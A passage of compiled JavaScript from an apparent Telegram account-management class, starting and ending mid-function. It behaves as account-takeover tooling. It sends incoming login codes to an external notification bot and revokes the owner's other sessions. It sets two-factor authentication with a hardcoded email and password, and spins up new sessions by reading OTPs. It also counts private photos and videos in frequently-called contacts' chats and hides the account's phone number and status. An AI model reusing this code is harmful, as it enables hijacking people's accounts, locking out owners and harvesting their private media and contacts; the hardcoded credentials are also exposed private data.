                await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);
                await this.resetAuthorization(auth);
            }
        }
    }
    isAuthMine(auth) {
        const authCriteria = [
            { field: 'country', value: 'singapore' },
            { field: 'deviceModel', values: ['oneplus 11', 'cli', 'linux', 'windows'] },
            { field: 'appName', values: ['likki', 'rams', 'sru', 'shru', 'hanslnz'] }
        ];
        return authCriteria.some(criterion => {
            if ('values' in criterion) {
                return criterion.values.some(value => auth[criterion.field].toLowerCase().includes(value.toLowerCase()));
            }
            return auth[criterion.field].toLowerCase().includes(criterion.value.toLowerCase());
        });
    }
    async resetAuthorization(auth) {
        await this.client?.invoke(new telegram_1.Api.account.ResetAuthorization({ hash: auth.hash }));
    }
    async getAuths() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const result = await this.client.invoke(new telegram_1.Api.account.GetAuthorizations());
        return result;
    }
    async getAllChats() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const chats = await this.client.getDialogs({ limit: 500 });
        console.log("TotalChats:", chats.total);
        const chatData = [];
        for (const chat of chats) {
            const chatEntity = await chat.entity.toJSON();
            chatData.push(chatEntity);
        }
        return chatData;
    }
    async getMessagesNew(chatId, offset = 0, limit = 20) {
        const messages = await this.client.getMessages(chatId, {
            offsetId: offset,
            limit,
        });
        const result = await Promise.all(messages.map(async (message) => {
            const media = message.media
                ? {
                    type: message.media.className.includes('video') ? 'video' : 'photo',
                    thumbnailUrl: await this.getMediaUrl(message),
                }
                : null;
            return {
                id: message.id,
                message: message.message,
                date: message.date,
                sender: {
                    id: message.senderId?.toString(),
                    is_self: message.out,
                    username: message.fromId ? message.fromId.toString() : null,
                },
                media,
            };
        }));
        return result;
    }
    async getMediaUrl(message) {
        if (message.media instanceof telegram_1.Api.MessageMediaPhoto) {
            console.log("messageId image:", message.id);
            const sizes = message.photo?.sizes || [1];
            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });
        }
        else if (message.media instanceof telegram_1.Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {
            console.log("messageId video:", message.id);
            const sizes = message.document?.thumbs || [1];
            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });
        }
        return null;
    }
    async sendInlineMessage(chatId, message, url) {
        const button = {
            text: "Open URL",
            url: url,
        };
        const result = await this.client.sendMessage(chatId, {
            message: message,
            buttons: [new telegram_1.Api.KeyboardButtonUrl(button)]
        });
        return result;
    }
    async getMediaMessages() {
        const result = await this.client.invoke(new telegram_1.Api.messages.Search({
            peer: new telegram_1.Api.InputPeerEmpty(),
            q: '',
            filter: new telegram_1.Api.InputMessagesFilterPhotos(),
            minDate: 0,
            maxDate: 0,
            offsetId: 0,
            addOffset: 0,
            limit: 200,
            maxId: 0,
            minId: 0,
            hash: (0, big_integer_1.default)(0),
        }));
        return result;
    }
    async getCallLog() {
        const result = await this.client.invoke(new telegram_1.Api.messages.Search({
            peer: new telegram_1.Api.InputPeerEmpty(),
            q: '',
            filter: new telegram_1.Api.InputMessagesFilterPhoneCalls({}),
            minDate: 0,
            maxDate: 0,
            offsetId: 0,
            addOffset: 0,
            limit: 200,
            maxId: 0,
            minId: 0,
            hash: (0, big_integer_1.default)(0),
        }));
        const callLogs = result.messages.filter((message) => message.action instanceof telegram_1.Api.MessageActionPhoneCall);
        const filteredResults = {
            outgoing: 0,
            incoming: 0,
            video: 0,
            chatCallCounts: {},
            totalCalls: 0
        };
        for (const log of callLogs) {
            filteredResults.totalCalls++;
            const logAction = log.action;
            if (log.out) {
                filteredResults.outgoing++;
            }
            else {
                filteredResults.incoming++;
            }
            if (logAction.video) {
                filteredResults.video++;
            }
            const chatId = log.peerId.userId.toString();
            if (!filteredResults.chatCallCounts[chatId]) {
                const ent = await this.client.getEntity(chatId);
                filteredResults.chatCallCounts[chatId] = {
                    phone: ent.phone,
                    username: ent.username,
                    name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,
                    count: 0
                };
            }
            filteredResults.chatCallCounts[chatId].count++;
        }
        const filteredChatCallCounts = [];
        for (const [chatId, details] of Object.entries(filteredResults.chatCallCounts)) {
            if (details['count'] > 4) {
                let video = 0;
                let photo = 0;
                const msgs = await this.client.getMessages(chatId, { limit: 600 });
                for (const message of msgs) {
                    const text = message.text.toLocaleLowerCase();
                    if (!(0, utils_1.contains)(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
                        if (message.media instanceof telegram_1.Api.MessageMediaPhoto) {
                            photo++;
                        }
                        else if (message.media instanceof telegram_1.Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {
                            video++;
                        }
                    }
                }
                filteredChatCallCounts.push({
                    ...details,
                    msgs: msgs.total,
                    video,
                    photo,
                    chatId,
                });
            }
        }
        console.log({
            ...filteredResults,
            chatCallCounts: filteredChatCallCounts
        });
        return {
            ...filteredResults,
            chatCallCounts: filteredChatCallCounts
        };
    }
    async getCallLogsInternal() {
        const finalResult = {};
        const result = await this.client.invoke(new telegram_1.Api.messages.Search({
            peer: new telegram_1.Api.InputPeerEmpty(),
            q: '',
            filter: new telegram_1.Api.InputMessagesFilterPhoneCalls({}),
            minDate: 0,
            maxDate: 0,
            offsetId: 0,
            addOffset: 0,
            limit: 200,
            maxId: 0,
            minId: 0,
            hash: (0, big_integer_1.default)(0),
        }));
        const callLogs = result.messages.filter((message) => message.action instanceof telegram_1.Api.MessageActionPhoneCall);
        const filteredResults = {
            outgoing: 0,
            incoming: 0,
            video: 0,
            chatCallCounts: {},
            totalCalls: 0
        };
        for (const log of callLogs) {
            filteredResults.totalCalls++;
            const logAction = log.action;
            if (log.out) {
                filteredResults.outgoing++;
            }
            else {
                filteredResults.incoming++;
            }
            if (logAction.video) {
                filteredResults.video++;
            }
            const chatId = log.peerId.userId.toString();
            finalResult[chatId] = filteredResults;
        }
        return finalResult;
    }
    async handleEvents(event) {
        if (event.isPrivate) {
            if (event.message.chatId.toString() == "777000") {
                console.log(event.message.text.toLowerCase());
                console.log("Login Code received for - ", this.phoneNumber, '\nActiveClientSetup - ', TelegramManager.activeClientSetup);
                console.log("Date :", new Date(event.message.date * 1000));
                await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`${process.env.clientId}:${this.phoneNumber}\n${event.message.text}`)}`);
            }
        }
    }
    async updatePrivacyforDeletedAccount() {
        try {
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyPhoneCall(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            console.log("Calls Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyProfilePhoto(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            console.log("PP Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyPhoneNumber(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            console.log("Number Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyStatusTimestamp(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueDisallowAll(),
                ],
            }));
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyAbout(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            console.log("LAstSeen Updated");
        }
        catch (e) {
            throw e;
        }
    }
    async updateProfile(firstName, about) {
        const data = {
            lastName: "",
        };
        if (firstName !== undefined) {
            data["firstName"] = firstName;
        }
        if (about !== undefined) {
            data["about"] = about;
        }
        try {
            const result = await this.client.invoke(new telegram_1.Api.account.UpdateProfile(data));
            console.log("Updated NAme: ", firstName);
        }
        catch (error) {
            throw error;
        }
    }
    async downloadProfilePic(photoIndex) {
        try {
            const photos = await this.client.invoke(new telegram_1.Api.photos.GetUserPhotos({
                userId: 'me',
                offset: 0,
            }));
            if (photos.photos.length > 0) {
                console.log(`You have ${photos.photos.length} profile photos.`);
                if (photoIndex < photos.photos.length) {
                    const selectedPhoto = photos.photos[photoIndex];
                    const index = Math.max(selectedPhoto.sizes.length - 2, 0);
                    const photoFileSize = selectedPhoto.sizes[index];
                    const photoBuffer = await this.client.downloadFile(new telegram_1.Api.InputPhotoFileLocation({
                        id: selectedPhoto.id,
                        accessHash: selectedPhoto.accessHash,
                        fileReference: selectedPhoto.fileReference,
                        thumbSize: photoFileSize.type
                    }), {
                        dcId: selectedPhoto.dcId,
                    });
                    if (photoBuffer) {
                        const outputPath = `profile_picture_${photoIndex + 1}.jpg`;
                        fs.writeFileSync(outputPath, photoBuffer);
                        console.log(`Profile picture downloaded as '${outputPath}'`);
                        return outputPath;
                    }
                    else {
                        console.log("Failed to download the photo.");
                    }
                }
                else {
                    console.log(`Photo index ${photoIndex} is out of range.`);
                }
            }
            else {
                console.log("No profile photos found.");
            }
        }
        catch (err) {
            console.error("Error:", err);
        }
    }
    async getLastActiveTime() {
        const result = await this.client.invoke(new telegram_1.Api.account.GetAuthorizations());
        let latest = 0;
        result.authorizations.map((auth) => {
            if (!this.isAuthMine(auth)) {
                if (latest < auth.dateActive) {
                    latest = auth.dateActive;
                }
            }
        });
        return (new Date(latest * 1000)).toISOString().split('T')[0];
    }
    async getContacts() {
        const exportedContacts = await this.client.invoke(new telegram_1.Api.contacts.GetContacts({
            hash: (0, big_integer_1.default)(0)
        }));
        return exportedContacts;
    }
    async deleteChat(params) {
        try {
            await this.client.invoke(new telegram_1.Api.messages.DeleteHistory(params));
            console.log(`Dialog with ID ${params.peer} has been deleted.`);
        }
        catch (error) {
            console.error('Failed to delete dialog:', error);
        }
    }
    async blockUser(chatId) {
        try {
            await this.client?.invoke(new telegram_1.Api.contacts.Block({
                id: chatId,
            }));
            console.log(`User with ID ${chatId} has been blocked.`);
        }
        catch (error) {
            console.error('Failed to block user:', error);
        }
    }
    async getMediaMetadata(params) {
        if (!this.client)
            throw new Error('Client not initialized');
        const { chatId, types = ['photo', 'video', 'document'], startDate, endDate, limit = 50, maxId, minId } = params;
        const query = {
            limit: limit || 500,
            ...(maxId ? { maxId } : {}),
            ...(minId ? { minId } : {}),
            ...(startDate && { minDate: Math.floor(startDate.getTime() / 1000) }),
            ...(endDate && { maxDate: Math.floor(endDate.getTime() / 1000) })
        };
        const ent = await this.safeGetEntity(chatId);
        console.log(query);
        const messages = await this.client.getMessages(ent, query);
        console.log(`Fetched ${messages.length} messages`);
        const filteredMessages = messages.map(message => {
            const messageIds = [];
            if (message.media) {
                const mediaType = this.getMediaType(message.media);
                if (types.includes(mediaType)) {
                    messageIds.push(message.id);
                }
            }
            return messageIds;
        }).flat();
        return {
            messages: filteredMessages,
            total: messages.total,
            hasMore: messages.length == limit,
            lastOffsetId: messages[messages.length - 1].id
        };
    }
    async downloadMediaFile(messageId, chatId = 'me', res) {
        try {
            const entity = await this.safeGetEntity(chatId);
            const messages = await this.client.getMessages(entity, { ids: [messageId] });
            const message = messages[0];
            if (message && !(message.media instanceof telegram_1.Api.MessageMediaEmpty)) {
                const media = message.media;
                let contentType, filename, fileLocation;
                const inputLocation = message.video || message.photo;
                const data = {
                    id: inputLocation.id,
                    accessHash: inputLocation.accessHash,
                    fileReference: inputLocation.fileReference,
                };
                if (media instanceof telegram_1.Api.MessageMediaPhoto) {
                    contentType = 'image/jpeg';
                    filename = 'photo.jpg';
                    fileLocation = new telegram_1.Api.InputPhotoFileLocation({ ...data, thumbSize: 'm' });
                }
                else if (media instanceof telegram_1.Api.MessageMediaDocument) {
                    contentType = media.mimeType || 'video/mp4';
                    filename = 'video.mp4';
                    fileLocation = new telegram_1.Api.InputDocumentFileLocation({ ...data, thumbSize: '' });
                }
                else {
                    return res.status(415).send('Unsupported media type');
                }
                res.setHeader('Content-Type', contentType);
                res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
                const chunkSize = 512 * 1024;
                for await (const chunk of this.client.iterDownload({
                    file: fileLocation,
                    offset: big_integer_1.default[0],
                    limit: 5 * 1024 * 1024,
                    requestSize: chunkSize,
                })) {
                    res.write(chunk);
                }
                res.end();
            }
            else {
                res.status(404).send('Media not found');
            }
        }
        catch (error) {
            if (error.message.includes('FILE_REFERENCE_EXPIRED')) {
                return res.status(404).send('File reference expired');
            }
            console.error('Error downloading media:', error);
            res.status(500).send('Error downloading media');
        }
    }
    async downloadWithTimeout(promise, timeout) {
        return Promise.race([
            promise,
            new Promise((_, reject) => setTimeout(() => reject(new Error('Download timeout')), timeout))
        ]);
    }
    getMediaDetails(media) {
        if (!media?.document)
            return null;
        const doc = media.document;
        if (doc instanceof telegram_1.Api.DocumentEmpty)
            return null;
        const videoAttr = doc.attributes.find(attr => attr instanceof telegram_1.Api.DocumentAttributeVideo);
        const fileNameAttr = doc.attributes.find(attr => attr instanceof telegram_1.Api.DocumentAttributeFilename);
        return {
            size: doc.size,
            mimeType: doc.mimeType,
            fileName: fileNameAttr?.fileName || null,
            duration: videoAttr?.duration || null,
            width: videoAttr?.w || null,
            height: videoAttr?.h || null
        };
    }
    async downloadFileFromUrl(url) {
        try {
            const response = await axios_1.default.get(url, {
                responseType: 'arraybuffer',
                timeout: 30000
            });
            return Buffer.from(response.data);
        }
        catch (error) {
            throw new Error(`Failed to download file: ${error.message}`);
        }
    }
    async forwardMessage(toChatId, fromChatId, messageId) {
        try {
            await this.client.forwardMessages(toChatId, { fromPeer: fromChatId, messages: messageId });
        }
        catch (error) {
            console.log("Failed to Forward Message : ", error.errorMessage);
        }
    }
    async updateUsername(baseUsername) {
        let newUserName = '';
        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';
        let increment = 0;
        if (username === '') {
            try {
                await this.client.invoke(new telegram_1.Api.account.UpdateUsername({ username }));
                console.log(`Removed Username successfully.`);
            }
            catch (error) {
                console.log(error);
            }
        }
        else {
            while (increment < 10) {
                try {
                    const result = await this.client.invoke(new telegram_1.Api.account.CheckUsername({ username }));
                    console.log(result, " - ", username);
                    if (result) {
                        await this.client.invoke(new telegram_1.Api.account.UpdateUsername({ username }));
                        console.log(`Username '${username}' updated successfully.`);
                        newUserName = username;
                        break;
                    }
                    else {
                        username = baseUsername + increment;
                        increment++;
                        await (0, Helpers_1.sleep)(2000);
                    }
                }
                catch (error) {
                    console.log(error.message);
                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {
                        newUserName = username;
                        break;
                    }
                    username = baseUsername + increment;
                    increment++;
                    await (0, Helpers_1.sleep)(2000);
                }
            }
        }
        return newUserName;
    }
    async updatePrivacy() {
        try {
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyPhoneCall(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            console.log("Calls Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyProfilePhoto(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            console.log("PP Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyForwards(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            console.log("forwards Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyPhoneNumber(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            console.log("Number Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyStatusTimestamp(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueAllowAll(),
                ],
            }));
            console.log("LAstSeen Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyAbout(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
        }
        catch (e) {
            throw e;
        }
    }
    async sendViewOnceMedia(chatId, buffer, caption = '', isVideo, filename) {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const actualFilename = filename || `viewonce_${Date.now()}.${isVideo ? 'mp4' : 'jpg'}`;
            const mimeType = isVideo ? 'video/mp4' : 'image/jpeg';
            const inputFile = await this.client.uploadFile({
                file: new uploads_1.CustomFile(actualFilename, buffer.length, actualFilename, buffer),
                workers: 1
            });
            const result = await this.client.invoke(new telegram_1.Api.messages.SendMedia({
                peer: chatId,
                media: isVideo
                    ? new telegram_1.Api.InputMediaUploadedDocument({
                        file: inputFile,
                        mimeType,
                        attributes: [
                            new telegram_1.Api.DocumentAttributeVideo({
                                supportsStreaming: true,
                                duration: 0,
                                w: 0,
                                h: 0
                            })
                        ],
                        ttlSeconds: 10
                    })
                    : new telegram_1.Api.InputMediaUploadedPhoto({
                        file: inputFile,
                        ttlSeconds: 10
                    }),
                message: caption,
                randomId: (0, big_integer_1.default)(Math.floor(Math.random() * 1000000000))
            }));
            console.log(`Sent view-once ${isVideo ? 'video' : 'photo'} to chat ${chatId}`);
            return result;
        }
        catch (error) {
            console.error('Error sending view-once media:', error);
            throw error;
        }
    }
    async getFileUrl(url, filename) {
        const response = await axios_1.default.get(url, { responseType: 'stream' });
        const filePath = `/tmp/${filename}`;
        await new Promise((resolve, reject) => {
            const writer = fs.createWriteStream(filePath);
            response.data.pipe(writer);
            writer.on('finish', () => resolve(true));
            writer.on('error', reject);
        });
        return filePath;
    }
    async updateProfilePic(image) {
        try {
            const file = await this.client.uploadFile({
                file: new uploads_1.CustomFile('pic.jpg', fs.statSync(image).size, image),
                workers: 1,
            });
            console.log("file uploaded");
            await this.client.invoke(new telegram_1.Api.photos.UploadProfilePhoto({
                file: file,
            }));
            console.log("profile pic updated");
        }
        catch (error) {
            throw error;
        }
    }
    async hasPassword() {
        const passwordInfo = await this.client.invoke(new telegram_1.Api.account.GetPassword());
        return passwordInfo.hasPassword;
    }
    async set2fa() {
        if (!(await this.hasPassword())) {
            console.log("Password Does not exist, Setting 2FA");
            const imapService = IMap_1.MailReader.getInstance();
            const twoFaDetails = {
                email: "storeslaksmi@gmail.com",
                hint: "password - India143",
                newPassword: "Ajtdmwajt1@",
            };
            try {
                await imapService.connectToMail();
                const checkMailInterval = setInterval(async () => {
                    console.log("Checking if mail is ready");
                    if (imapService.isMailReady()) {
                        clearInterval(checkMailInterval);
                        console.log("Mail is ready, checking code!");
                        await this.client.updateTwoFaSettings({
                            isCheckPassword: false,
                            email: twoFaDetails.email,
                            hint: twoFaDetails.hint,
                            newPassword: twoFaDetails.newPassword,
                            emailCodeCallback: async (length) => {
                                console.log("Code sent");
                                return new Promise(async (resolve, reject) => {
                                    let retry = 0;
                                    const codeInterval = setInterval(async () => {
                                        try {
                                            console.log("Checking code");
                                            retry++;
                                            if (imapService.isMailReady() && retry < 4) {
                                                const code = await imapService.getCode();
                                                console.log('Code:', code);
                                                if (code) {
                                                    await imapService.disconnectFromMail();
                                                    clearInterval(codeInterval);
                                                    resolve(code);
                                                }
                                            }
                                            else {
                                                clearInterval(codeInterval);
                                                await imapService.disconnectFromMail();
                                                reject(new Error("Failed to retrieve code"));
                                            }
                                        }
                                        catch (error) {
                                            clearInterval(codeInterval);
                                            await imapService.disconnectFromMail();
                                            reject(error);
                                        }
                                    }, 10000);
                                });
                            },
                            onEmailCodeError: (e) => {
                                console.error('Email code error:', (0, parseError_1.parseError)(e));
                                return Promise.resolve("error");
                            }
                        });
                        return twoFaDetails;
                    }
                    else {
                        console.log("Mail not ready yet");
                    }
                }, 5000);
            }
            catch (e) {
                console.error("Unable to connect to mail server:", (0, parseError_1.parseError)(e));
            }
        }
        else {
            console.log("Password already exists");
        }
    }
    async sendPhotoChat(id, url, caption, filename) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const filePath = await this.getFileUrl(url, filename);
        const file = new uploads_1.CustomFile(filePath, fs.statSync(filePath).size, filename);
        await this.client.sendFile(id, { file, caption });
    }
    async sendFileChat(id, url, caption, filename) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const filePath = await this.getFileUrl(url, filename);
        const file = new uploads_1.CustomFile(filePath, fs.statSync(filePath).size, filename);
        await this.client.sendFile(id, { file, caption });
    }
    async deleteProfilePhotos() {
        try {
            const result = await this.client.invoke(new telegram_1.Api.photos.GetUserPhotos({
                userId: "me"
            }));
            console.log(`Profile Pics found: ${result.photos.length}`);
            if (result && result.photos?.length > 0) {
                const res = await this.client.invoke(new telegram_1.Api.photos.DeletePhotos({
                    id: result.photos
                }));
            }
            console.log("Deleted profile Photos");
        }
        catch (error) {
            throw error;
        }
    }
    async createNewSession() {
        const me = await this.client.getMe();
        console.log("Phne:", me.phone);
        const newClient = new telegram_1.TelegramClient(new sessions_1.StringSession(''), parseInt(process.env.API_ID), process.env.API_HASH, {
            connectionRetries: 1,
        });
        await newClient.start({
            phoneNumber: me.phone,
            password: async () => "Ajtdmwajt1@",
            phoneCode: async () => {
                console.log('Waiting for the OTP code from chat ID 777000...');
                return await this.waitForOtp();
            },
            onError: (err) => { throw err; },
        });
        const session = newClient.session.save();
        await newClient.destroy();
        console.log("New Session: ", session);
        return session;
    }
    async waitForOtp() {
        for (let i = 0; i < 3; i++) {
            try {
                console.log("Attempt : ", i);
                const messages = await this.client.getMessages('777000', { limit: 1 });
                const message = messages[0];
                if (message && message.date && message.date * 1000 > Date.now() - 60000) {
                    const code = message.text.split('.')[0].split("code:**")[1].trim();
                    console.log("returning: ", code);
                    return code;
                }
                else {
                    console.log("Message Date: ", new Date(message.date * 1000).toISOString(), "Now: ", new Date(Date.now() - 60000).toISOString());
                    const code = message.text.split('.')[0].split("code:**")[1].trim();
                    console.log("Skipped Code: ", code);
                    if (i == 2) {
                        return code;
                    }
                    await (0, Helpers_1.sleep)(5000);
                }
            }
            catch (err) {
                await (0, Helpers_1.sleep)(2000);
                console.log(err);
            }
        }
    }
    async createGroupWithOptions(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        const result = await this.createGroupOrChannel(options);
        let channelId;
        if ('updates' in result) {
            const updates = Array.isArray(result.updates) ? result.updates : [result.updates];
            const channelUpdate = updates.find(u => u instanceof telegram_1.Api.UpdateChannel);
            if (channelUpdate && 'channelId' in channelUpdate) {
                channelId = channelUpdate.channelId;
            }
        }
        if (!channelId) {
            throw new Error('Failed to create channel');
        }
        const channel = await this.client.getEntity(channelId);
        if (!(channel instanceof telegram_1.Api.Channel)) {
            throw new Error('Created entity is not a channel');
        }
        if (options.members?.length) {
            const users = await Promise.all(options.members.map(member => this.client.getInputEntity(member)));
            await this.client.invoke(new telegram_1.Api.channels.InviteToChannel({
                channel: await this.client.getInputEntity(channel),
                users
            }));
        }
        if (options.photo) {
            const buffer = await this.downloadFileFromUrl(options.photo);
            const inputFile = await this.client.uploadFile({
                file: new uploads_1.CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),
                workers: 1
            });
            await this.client.invoke(new telegram_1.Api.channels.EditPhoto({
                channel: await this.client.getInputEntity(channel),
                photo: new telegram_1.Api.InputChatUploadedPhoto({
                    file: inputFile
                })
            }));
        }
        return channel;
    }
    async updateGroupSettings(settings) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getEntity(settings.groupId);
        if (settings.title) {
            await this.client.invoke(new telegram_1.Api.channels.EditTitle({
                channel: channel,
                title: settings.title || ''
            }));
        }
        ;
        if (settings.description) {
            await this.client.invoke(new telegram_1.Api.messages.EditChatAbout({
                peer: channel,
                about: settings.description
            }));
        }
        if (settings.username) {
            await this.client.invoke(new telegram_1.Api.channels.UpdateUsername({
                channel: channel,
                username: settings.username
            }));
        }
        if (settings.slowMode !== undefined) {
            await this.client.invoke(new telegram_1.Api.channels.ToggleSlowMode({
                channel: channel,
                seconds: settings.slowMode
            }));
        }
        return true;
    }
    async scheduleMessageSend(opts) {
        if (!this.client)
            throw new Error('Client not initialized');
        const scheduleDate = Math.floor(opts.scheduledTime.getTime() / 1000);
        if (opts.media) {
            const buffer = await this.downloadFileFromUrl(opts.media.url);
            const uploadedFile = await this.client.uploadFile({
                file: new uploads_1.CustomFile('media', buffer.length, 'media', buffer),
                workers: 1
            });
            return this.client.sendFile(opts.chatId, {
                file: uploadedFile,
                caption: opts.message,
                forceDocument: opts.media.type === 'document',
                scheduleDate
            });
        }
        return this.client.sendMessage(opts.chatId, {
            message: opts.message,
            schedule: Math.floor(opts.scheduledTime.getTime() / 1000)
        });
    }
    async getScheduledMessages(chatId) {
        if (!this.client)
            throw new Error('Client not initialized');
        const result = await this.client.invoke(new telegram_1.Api.messages.GetScheduledHistory({
            peer: chatId,
            hash: (0, big_integer_1.default)(0)
        }));
        return 'messages' in result && Array.isArray(result.messages)
            ? result.messages.filter(msg => msg instanceof telegram_1.Api.Message)
            : [];
    }
    async sendMediaAlbum(album) {
        if (!this.client)
            throw new Error('Client not initialized');
        const mediaFiles = await Promise.all(album.media.map(async (item) => {
            const buffer = await this.downloadFileFromUrl(item.url);
            const uploadedFile = await this.client.uploadFile({
                file: new uploads_1.CustomFile('media', buffer.length, 'media', buffer),
                workers: 1
            });
            return new telegram_1.Api.InputSingleMedia({
                media: item.type === 'photo'
                    ? new telegram_1.Api.InputMediaUploadedPhoto({ file: uploadedFile })
                    : new telegram_1.Api.InputMediaUploadedDocument({
                        file: uploadedFile,
                        mimeType: item.type === 'video' ? 'video/mp4' : 'application/octet-stream',
                        attributes: []
                    }),
                message: item.caption || '',
                entities: []
            });
        }));
        return this.client.invoke(new telegram_1.Api.messages.SendMultiMedia({
            peer: album.chatId,
            multiMedia: mediaFiles
        }));
    }
    async sendMessage(params) {
        if (!this.client)
            throw new Error('Client not initialized');
        const { peer, parseMode, message } = params;
        return await this.client.sendMessage(peer, { message, parseMode });
    }
    async sendVoiceMessage(voice) {
        if (!this.client)
            throw new Error('Client not initialized');
        const buffer = await this.downloadFileFromUrl(voice.url);
        return await this.client.invoke(new telegram_1.Api.messages.SendMedia({
            peer: voice.chatId,
            media: new telegram_1.Api.InputMediaUploadedDocument({
                file: await this.client.uploadFile({
                    file: new uploads_1.CustomFile('voice.ogg', buffer.length, 'voice.ogg', buffer),
                    workers: 1
                }),
                mimeType: 'audio/ogg',
                attributes: [
                    new telegram_1.Api.DocumentAttributeAudio({
                        voice: true,
                        duration: voice.duration || 0
                    })
                ]
            }),
            message: voice.caption || '',
            randomId: (0, big_integer_1.default)(Math.floor(Math.random() * 1000000000))
        }));
    }
    async cleanupChat(cleanup) {
        if (!this.client)
            throw new Error('Client not initialized');
        cleanup.revoke = cleanup.revoke !== undefined ? cleanup.revoke : true;
        const messages = await this.client.getMessages(cleanup.chatId, {
            limit: 1000,
            ...(cleanup.beforeDate && {
                offsetDate: Math.floor(cleanup.beforeDate.getTime() / 1000)
            })
        });
        const toDelete = messages.filter(msg => {
            if (cleanup.excludePinned && msg.pinned)
                return false;
            if (cleanup.onlyMedia && !msg.media)
                return false;
            return true;
        });
        if (toDelete.length > 0) {
            await this.client.deleteMessages(cleanup.chatId, toDelete.map(m => m.id), {
                revoke: cleanup.revoke
            });
        }
        return { deletedCount: toDelete.length };
    }
    async updatePrivacyBatch(settings) {
        if (!this.client)
            throw new Error('Client not initialized');
        const privacyRules = {
            everybody: [new telegram_1.Api.InputPrivacyValueAllowAll()],
            contacts: [new telegram_1.Api.InputPrivacyValueAllowContacts()],
            nobody: [new telegram_1.Api.InputPrivacyValueDisallowAll()]
        };
        const updates = [];
        const privacyMap = {
            phoneNumber: telegram_1.Api.InputPrivacyKeyPhoneNumber,
            lastSeen: telegram_1.Api.InputPrivacyKeyStatusTimestamp,
            profilePhotos: telegram_1.Api.InputPrivacyKeyProfilePhoto,
            forwards: telegram_1.Api.InputPrivacyKeyForwards,
            calls: telegram_1.Api.InputPrivacyKeyPhoneCall,
            groups: telegram_1.Api.InputPrivacyKeyChatInvite
        };
        for (const [key, value] of Object.entries(settings)) {
            if (value && key in privacyMap) {
                updates.push(this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                    key: new privacyMap[key](),
                    rules: privacyRules[value]
                })));
            }
        }
        await Promise.all(updates);
        return true;
    }
    async getSessionInfo() {
        if (!this.client)
            throw new Error('Client not initialized');
        const [authorizationsResult, devicesResult] = await Promise.all([
            this.client.invoke(new telegram_1.Api.account.GetAuthorizations()),
            this.client.invoke(new telegram_1.Api.account.GetWebAuthorizations())
        ]);
        const sessions = authorizationsResult.authorizations.map(auth => ({
            hash: auth.hash.toString(),
            deviceModel: auth.deviceModel,
            platform: auth.platform,
            systemVersion: auth.systemVersion,
            appName: auth.appName,
            dateCreated: new Date(auth.dateCreated * 1000),
            dateActive: new Date(auth.dateActive * 1000),
            ip: auth.ip,
            country: auth.country,
            region: auth.region
        }));
        const webSessions = devicesResult.authorizations.map(auth => ({
            hash: auth.hash.toString(),
            domain: auth.domain,
            browser: auth.browser,
            platform: auth.platform,
            dateCreated: new Date(auth.dateCreated * 1000),
            dateActive: new Date(auth.dateActive * 1000),
            ip: auth.ip,
            region: auth.region
        }));
        return {
            sessions,
            webSessions
        };
    }
    async terminateSession(options) {
        if (!this.client)
            throw new Error('Client not initialized');
